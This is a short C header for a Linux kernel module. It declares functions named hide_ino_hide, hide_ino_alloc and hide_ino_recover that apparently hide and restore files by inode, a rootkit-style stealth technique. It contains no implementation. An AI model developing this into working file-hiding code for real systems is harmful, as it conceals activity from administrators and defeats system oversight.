#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/list.h>
#include <linux/slab.h>

typedef struct inode inode_t;
typedef inode_t** inode_list;

int hide_ino_hide(const char*);
int hide_ino_alloc(inode_t**, inode_t**);
int hide_ino_hide(const char*);
int hide_ino_recover(void);
